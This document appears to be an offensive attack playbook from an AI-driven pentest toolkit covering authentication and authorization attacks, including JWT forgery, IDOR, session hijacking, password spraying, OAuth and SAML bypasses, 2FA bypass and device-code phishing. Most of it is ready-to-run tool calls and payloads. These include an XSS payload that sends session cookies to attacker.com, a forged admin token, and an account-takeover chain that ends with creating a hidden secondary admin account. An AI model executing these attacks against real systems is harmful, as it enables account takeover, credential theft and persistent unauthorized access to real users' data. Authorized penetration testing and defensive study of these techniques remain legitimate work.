# TTP: Authentication & Authorization Attacks

Techniques for exploiting authentication mechanisms, session management,
and access control flaws. Covers JWT attacks, IDOR, OAuth flaws, session
hijacking, credential stuffing, and privilege escalation.

**MITRE ATT&CK**: T1078 (Valid Accounts), T1110 (Brute Force), T1539 (Steal Web Session Cookie)

---

## Quick Decision Tree

```
IF login form present:
  → Credential stuffing / password spraying (hydra_brute_force)
  → Default credentials check
  → SQLi on login (read hexstrike://ttp/web-injection)

IF JWT token in use:
  → jwt_toolkit_analyze for algorithm attacks

IF API with sequential IDs:
  → IDOR testing via http_repeater

IF OAuth flow present:
  → Redirect URI manipulation, state parameter check

IF session cookies present:
  → Session fixation, cookie analysis
```

---

## 1. JWT (JSON Web Token) Attacks

### 1a. JWT Analysis

```
jwt_toolkit_analyze(token="eyJhbGciOiJIUzI1NiIs...")
→ Returns: algorithm, claims, expiry, known vulnerabilities
```

**Manual JWT structure** (three base64url parts separated by dots):
```
HEADER.PAYLOAD.SIGNATURE

Header:  {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "1234", "name": "user", "role": "user", "exp": 1700000000}
Signature: HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)
```

### 1b. Algorithm None Attack

**When to use**: Server doesn't validate the algorithm field.

```
# Original token uses HS256
# Change header to: {"alg": "none", "typ": "JWT"}
# Remove signature (empty string after last dot)

# Craft payload with elevated privileges:
# {"sub": "1234", "name": "admin", "role": "admin"}

http_repeater(url="https://target.com/api/admin",
              headers={"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0IiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."})

# Variations that bypass weak checks:
# "alg": "None"
# "alg": "NONE"
# "alg": "nOnE"
```

### 1c. Algorithm Confusion (RS256 → HS256)

**When to use**: Server uses RS256 (asymmetric) but accepts HS256 (symmetric).

```
# Attack: Use the PUBLIC key as HMAC secret
# 1. Obtain public key (often at /jwks.json, /.well-known/jwks.json)
# 2. Change header to: {"alg": "HS256"}
# 3. Sign with HMAC using the public key as secret

http_repeater(url="https://target.com/.well-known/jwks.json")
→ Extract public key

# jwt_toolkit handles this automatically:
jwt_toolkit_analyze(token="<original_token>",
                    mode="key_confusion",
                    public_key="<extracted_public_key>")
```

### 1d. JWT Secret Brute Force

**When to use**: HS256 with a weak secret.

```
# Common weak secrets: secret, password, 123456, key, jwt_secret
jwt_toolkit_analyze(token="<token>", mode="brute_force",
                    wordlist="jwt-secrets.txt")

# Or use hashcat:
hashcat_crack(hash_file="jwt_hash.txt", mode=16500,
              wordlist="rockyou.txt")
# Mode 16500 = JWT (HS256)
```

### 1e. JWT Claim Tampering

After obtaining the signing secret or exploiting algorithm vulnerabilities:

```
# Privilege escalation — change role claim
Original:  {"sub": "user123", "role": "user"}
Tampered:  {"sub": "user123", "role": "admin"}

# User impersonation — change sub claim
Original:  {"sub": "user123", "name": "Regular User"}
Tampered:  {"sub": "admin", "name": "Administrator"}

# Bypass expiry — extend exp claim
Original:  {"exp": 1700000000}
Tampered:  {"exp": 9999999999}
```

### 1f. JWK Injection

**When to use**: Server fetches signing key from the token's JKU/X5U header.

```
# 1. Host your own JWKS at attacker-controlled URL
# 2. Set jku header to point to your URL
# 3. Sign token with your private key

# Header: {"alg": "RS256", "jku": "https://attacker.com/.well-known/jwks.json"}
```

---

## 2. IDOR (Insecure Direct Object Reference)

### 2a. Detection

```
# Step 1: Identify endpoints with object references
katana_crawl(target="https://target.com", depth=3)
→ Look for patterns: /api/users/123, /orders/456, /files/doc.pdf

# Step 2: Test access to other users' objects
http_repeater(url="https://target.com/api/users/123",
              headers={"Authorization": "Bearer <your_token>"})
# Change 123 → 124, 125, 1, 0, -1
```

### 2b. Common IDOR Patterns

**Sequential Integer IDs:**
```
GET /api/users/1001     → Your profile
GET /api/users/1002     → Someone else's profile (IDOR if accessible)
GET /api/users/1        → Often admin account

# Test with http_repeater:
http_repeater(url="https://target.com/api/users/1002",
              headers={"Authorization": "Bearer <regular_user_token>"})
```

**UUID/GUID Enumeration:**
```
# UUIDs are harder but not impossible
# Check if UUIDs are leaked in:
# - API responses (list endpoints returning other users' IDs)
# - URL parameters in emails/notifications
# - JavaScript source code
# - Error messages

# If UUID v1 (time-based): predictable, can be enumerated
# If UUID v4 (random): need leak source
```

**Encoded/Hashed IDs:**
```
# Base64 encoded: /api/users/MTAwMQ== (base64 of "1001")
# Simply encode the target ID: echo -n "1002" | base64

# MD5/SHA hashed: /api/files/5d41402abc4b2a76b9719d911017c592
# If hash of sequential number, precompute the hashes
```

### 2c. IDOR in Different HTTP Methods

```
# Test all methods on the same endpoint
http_method_scanner(url="https://target.com/api/users/1002")

# Common: GET is protected but PUT/DELETE is not
http_repeater(url="https://target.com/api/users/1002",
              method="PUT",
              body={"email": "attacker@evil.com"},
              headers={"Authorization": "Bearer <regular_user_token>"})

http_repeater(url="https://target.com/api/users/1002",
              method="DELETE",
              headers={"Authorization": "Bearer <regular_user_token>"})
```

### 2d. IDOR in File Operations

```
# File download IDOR
http_repeater(url="https://target.com/api/files/download?id=1001")
# Change id to access other users' files

# File path IDOR
http_repeater(url="https://target.com/api/files/invoice_1001.pdf")
# Try: invoice_1002.pdf, invoice_1.pdf

# Combined with path traversal:
http_repeater(url="https://target.com/api/files/download?path=../../../etc/passwd")
```

### 2e. Mass Assignment / Parameter Pollution

```
# Add unexpected parameters to requests
http_repeater(url="https://target.com/api/users/profile",
              method="PUT",
              body={"name": "Test", "role": "admin", "is_admin": true},
              headers={"Content-Type": "application/json"})

# Test with http_parameter_pollution:
http_parameter_pollution(url="https://target.com/api/update",
                         params={"role": ["user", "admin"]})
```

---

## 3. Session Attacks

### 3a. Session Analysis

```
http_cookie_analyzer(url="https://target.com")
→ Returns: cookie flags, expiry, entropy analysis

# Check for:
# - Missing HttpOnly flag (XSS can steal cookie)
# - Missing Secure flag (transmitted over HTTP)
# - Missing SameSite attribute (CSRF vulnerable)
# - Low entropy (predictable session IDs)
# - No expiry (persistent sessions)
```

### 3b. Session Fixation

```
# Step 1: Obtain a valid session ID (as attacker, before login)
http_repeater(url="https://target.com/login")
→ Note the session cookie value

# Step 2: Force victim to use this session ID
# Via URL: https://target.com/login?PHPSESSID=attacker_session
# Via cookie injection (if XSS available)

# Step 3: After victim logs in, attacker's session is now authenticated
http_repeater(url="https://target.com/dashboard",
              cookies={"PHPSESSID": "attacker_session"})
```

### 3c. Session Hijacking via XSS

```
# If XSS found and cookies lack HttpOnly:
# Inject payload to steal session:
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

# Use stolen cookie:
http_repeater(url="https://target.com/dashboard",
              cookies={"session": "<stolen_cookie_value>"})
```

---

## 4. Credential Attacks

### 4a. Brute Force

```
# Online brute force (respect rate limits)
hydra_brute_force(target="target.com",
                  service="https-form-post",
                  form_path="/login",
                  form_data="username=^USER^&password=^PASS^",
                  failure_string="Invalid credentials",
                  username_list="users.txt",
                  password_list="passwords.txt",
                  additional_args="-t 2 -W 5")
# -t 2 = 2 threads (avoid lockout)
# -W 5 = 5 second wait between attempts
```

### 4b. Password Spraying

```
# One password across many users (avoids lockout)
hydra_brute_force(target="target.com",
                  service="https-form-post",
                  form_path="/login",
                  form_data="username=^USER^&password=^PASS^",
                  failure_string="Invalid",
                  username_list="harvested_emails.txt",
                  password="Summer2024!",
                  additional_args="-t 1 -W 30")

# Common spray passwords:
# Season+Year+Special: Winter2024!, Spring2024!, Summer2024!
# Company+Number: TargetCorp123!, Target2024!
# Month+Year: January2024!, December2023!
# Welcome+Number: Welcome1!, Welcome123!
```

### 4c. Credential Stuffing (Using Breach Data)

```
# Step 1: Check for breached credentials
hibp_domain_search(domain="target.com")
hibp_breach_check(email="admin@target.com")

# Step 2: If breach found, try leaked credentials
# (Many users reuse passwords across services)
hydra_brute_force(target="target.com",
                  service="https-form-post",
                  combo_list="breach_creds.txt")
```

### 4d. Default Credentials

```
# Common default creds to test:
# admin:admin, admin:password, admin:123456
# root:root, root:toor
# test:test, guest:guest
# administrator:administrator

nuclei_scan(target="https://target.com",
            tags="default-login")
→ Checks for known default credentials on common platforms
```

---

## 5. OAuth / SSO Attacks

### 5a. Redirect URI Manipulation

```
# Standard OAuth flow:
# /authorize?client_id=X&redirect_uri=https://app.com/callback&response_type=code

# Test: change redirect_uri to attacker-controlled domain
http_repeater(url="https://auth.target.com/authorize",
              params={"client_id": "legit_client",
                      "redirect_uri": "https://attacker.com/steal",
                      "response_type": "code"})

# Bypass patterns if strict matching:
# https://app.com.attacker.com/callback
# https://app.com/callback/../../../attacker.com
# https://app.com/callback?next=https://attacker.com
# https://app.com/callback#@attacker.com
```

### 5b. State Parameter CSRF

```
# If state parameter missing or predictable:
# Attacker can initiate OAuth flow and link victim's account
# to attacker's identity on the OAuth provider

# Test: Remove state parameter
http_repeater(url="https://auth.target.com/authorize",
              params={"client_id": "X",
                      "redirect_uri": "https://app.com/callback",
                      "response_type": "code"})
# If it works without state → CSRF in OAuth
```

### 5c. Token Leakage

```
# Check if access tokens leak via:
# - Referer header (navigate from authenticated page to external link)
# - URL fragments (token in URL visible to JavaScript)
# - Browser history
# - Server logs

http_redirect_tracer(url="https://target.com/oauth/callback?token=xxx")
→ Check all redirect hops for token presence in URL
```

---

## 6. Two-Factor Authentication Bypass

### 6a. Common Bypass Techniques

```
# Direct page access (skip 2FA page)
http_repeater(url="https://target.com/dashboard",
              cookies={"session": "<pre-2fa-session>"})

# Brute force OTP (4-6 digit codes)
# 4 digit = 10,000 combinations
# 6 digit = 1,000,000 combinations
# Check for rate limiting first!

# Response manipulation
# If 2FA returns {"success": false}, try changing to {"success": true}

# Backup codes
# Often 8-digit numeric, check if rate-limited

# Previous session reuse
# If server doesn't invalidate pre-2FA sessions
```

### 6b. 2FA Rate Limit Testing

```
# Test if OTP verification is rate-limited
ffuf_scan(url="https://target.com/api/verify-otp",
          method="POST",
          data='{"otp": "FUZZ"}',
          wordlist="4digit.txt",
          mc="200",
          rate=10)

# If no rate limit → brute force the OTP
# If rate limit per IP → test with different IPs
# If rate limit per session → create new session per attempt
```

---

## Attack Chain: Auth Bypass → Account Takeover

```
Step 1: Enumerate users
  → theharvester_scan(target="target.com")
  → hibp_domain_search(domain="target.com")

Step 2: Test authentication
  → hydra_brute_force with password spraying
  → nuclei_scan with default-login tags
  → SQLi on login form (read hexstrike://ttp/web-injection)

Step 3: Bypass access controls
  → jwt_toolkit_analyze for token manipulation
  → IDOR testing via http_repeater
  → OAuth redirect manipulation

Step 4: Escalate privileges
  → Mass assignment (add role=admin to profile update)
  → JWT claim tampering (change role in token)
  → IDOR on admin endpoints

Step 5: Maintain access
  → Generate long-lived token
  → Create secondary admin account
  → Document all access for reporting
```

---

## 7. Modern Auth Techniques (2025–2026)

### 7a. SAML Authentication Bypass (PortSwigger 2025 Nominated)

**New SAML exploitation techniques enabling complete authentication bypass**
were a major research topic in 2025. SAML XML parsing remains a rich attack surface.

```
# SAML Response manipulation:
# 1. XML Signature Wrapping (XSW)
#    Move the signed assertion, insert a forged one
#    Signature validates on the original, app processes the forged one
#    8 known XSW attack variants (XSW1-XSW8)

# 2. Comment injection in NameID
#    <NameID>admin@target.com<!---->.evil.com</NameID>
#    IdP validates: admin@target.com.evil.com (your domain)
#    SP parses: admin@target.com (truncates at comment)

# 3. SAML assertion replay
#    Capture valid SAML response
#    Replay to SP before NotOnOrAfter expires
#    Works when SP doesn't track assertion IDs

# 4. Certificate confusion
#    Some SPs accept self-signed SAML responses
#    Or don't validate the signing certificate chain

# Testing:
nuclei_scan(target="https://target.com/saml/acs", tags="saml")
http_repeater(url="https://target.com/saml/acs",
              method="POST",
              body={"SAMLResponse": "<base64_modified_response>"})
```

### 7b. OAuth 2.0 Device Code Phishing (2025)

```
# Device Authorization Grant (RFC 8628) is increasingly exploited
# for phishing because it separates the auth device from the login device.

# Attack flow:
# 1. Attacker initiates device code flow with target's OAuth provider
# 2. Gets a user_code (e.g., "ABCD-1234")
# 3. Sends victim a link: https://microsoft.com/devicelogin
# 4. Victim enters the code thinking it's legitimate
# 5. Attacker now has the victim's OAuth tokens

# Why it works in 2025:
# - Microsoft, Google, GitHub all support device code flow
# - Login page is the REAL provider page (not a phishing clone)
# - No suspicious URLs — user visits the legitimate provider
# - Tokens include refresh tokens for long-term access

# Azure/M365 device code phishing:
# POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode
# → Returns: user_code, device_code, verification_uri
# Phish the user_code → poll for tokens with device_code
# → Full access to victim's M365 (mail, files, Teams)

# Detection in targets:
# Check if device code flow is enabled (it's on by default in Azure AD)
# Check for conditional access policies blocking device code
```

### 7c. Passkey / WebAuthn Bypass Attempts (2025+)

```
# As passkeys replace passwords, new attack surface emerges:

# 1. Fallback to password auth
#    Most sites keep password login as fallback
#    Attacker ignores passkey, uses credential stuffing on password endpoint
#    IF target has passkeys + password fallback:
#      → Attack the password endpoint, not the passkey one

# 2. Account recovery bypass
#    Passkey lost? Most sites fall back to email/SMS recovery
#    Attack the recovery flow instead of the passkey auth
#    → Password reset via compromised email / SIM swap

# 3. Cross-device registration MITM
#    During passkey registration via QR code (hybrid transport)
#    Attacker proxies the BLE/QR communication
#    Registers THEIR authenticator on victim's account

# 4. Platform authenticator extraction
#    If device is compromised, platform-bound passkeys
#    can be extracted from TPM/Secure Enclave depending on OS
#    Windows: extractable from Windows Hello via DPAPI
#    Android: extractable if device is rooted

# Testing passkey implementations:
# Check: Is password fallback available? → test that instead
# Check: Can multiple passkeys be registered? → register attacker key
# Check: Is passkey the only factor? → should be MFA
# Check: Recovery flow security → often weaker than passkey itself
```

### 7d. API Key & Token Leakage Patterns (2025)

```
# Modern API key exposure vectors:

# 1. Client-side API keys in JavaScript bundles
katana_crawl(target="https://target.com", js_crawl=True)
→ Extract: API keys, tokens, internal endpoints from JS files
# Look for: Authorization headers, Bearer tokens, API keys in fetch() calls

# 2. GitHub Actions secrets in logs
trufflehog_scan(target="https://github.com/target-org")
→ Scan workflow run logs for accidentally printed secrets
# Common: ${{ secrets.API_KEY }} used in echo/debug statements

# 3. Mobile app hardcoded tokens
# APK/IPA decompilation reveals embedded API keys
# API keys often have excessive permissions

# 4. GraphQL introspection leaking auth details
# GraphQL endpoints may expose auth-related types
# Query: { __schema { types { name fields { name } } } }
# Reveals: AuthToken type, Session fields, API key structures

# 5. Browser extension token theft
# Extensions with broad permissions can read tokens from:
# - localStorage, sessionStorage
# - Cookies (including HttpOnly via background scripts)
# - Request/response headers

# Modern detection:
nuclei_scan(target="https://target.com", tags="exposure,token,apikey")
gau_fetch(target="target.com")
→ Historical URLs may contain leaked tokens in query params
```

### 7e. Modern Session Attacks (2025)

```
# XS-Leaks for session detection (PortSwigger 2025 #6 & #8):
# Cross-site information leaks that detect auth state without XSS

# ETag Length Leak:
# Measure response size cross-origin via ETag header
# Different response size = authenticated vs unauthenticated
# Reveals: login state, role, personal data presence

# Cross-Origin Redirect Leak:
# Chrome connection-pool prioritization as oracle
# Detect which domain a cross-origin redirect goes to
# Reveals: auth state, OAuth provider, internal routing

# Cookie tossing in 2025:
# Set cookies on parent domain from subdomain
# Override session cookies for the main application
# Subdomain XSS → session fixation on main domain

# Browser-based attacks remain relevant:
# Service Worker persistence (survives cache clear)
# Web Push notification for C2 channel
# WebSocket hijacking for real-time session riding
```
